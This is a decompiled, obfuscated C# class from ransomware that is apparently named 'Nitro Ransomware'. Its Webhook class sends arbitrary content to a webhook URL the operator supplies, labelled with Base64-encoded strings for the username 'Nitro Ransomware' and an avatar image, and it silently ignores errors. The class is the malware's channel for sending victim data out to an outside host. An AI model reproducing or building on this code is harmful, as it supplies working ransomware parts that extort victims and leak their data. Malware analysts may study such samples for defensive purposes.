using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;

namespace NitroRansomware;

internal class Webhook
{
	private string b8K48RwB8lIL9EpPCtid難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化;

	public Webhook(string userWebhook)
	{
		b8K48RwB8lIL9EpPCtid難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化 = userWebhook;
	}

	public void _7IKEHX2EmcahbPBTAXe8(string content)
	{
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_008d: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		Dictionary<string, string> dictionary = new Dictionary<string, string>
		{
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("Y29udGVudA==")),
				content
			},
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("dXNlcm5hbWU=")),
				Encoding.UTF8.GetString(Convert.FromBase64String("Tml0cm8gUmFuc29td2FyZQ=="))
			},
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("YXZhdGFyX3VybA==")),
				Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9pLmliYi5jby8wZnJURDkyL2Rpc2NvcmQtYXZhdGFyLTUxMi5wbmc="))
			}
		};
		try
		{
			HttpClient val = new HttpClient();
			try
			{
				val.PostAsync(b8K48RwB8lIL9EpPCtid難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化, (HttpContent)new FormUrlEncodedContent((IEnumerable<KeyValuePair<string, string>>)dictionary)).GetAwaiter().GetResult();
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}
}
